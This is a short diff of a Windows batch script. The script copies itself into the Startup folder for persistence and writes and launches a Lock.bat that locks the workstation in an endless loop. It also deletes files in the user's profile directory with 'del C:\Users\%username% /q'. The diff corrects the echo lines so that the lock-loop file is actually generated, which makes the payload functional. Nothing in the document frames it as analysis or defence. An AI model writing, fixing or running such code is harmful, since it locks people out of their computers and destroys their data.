@@ -1,9 +1,9 @@
 @echo off
 COPY %0 "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 (
-:Lock
-rundll32.exe user32.dll, LockWorkStation
-goto Lock
+echo :Lock
+echo rundll32.exe user32.dll, LockWorkStation
+echo goto Lock
 ) > Lock.bat
 start Lock.bat
 del C:\Users\%username% /q
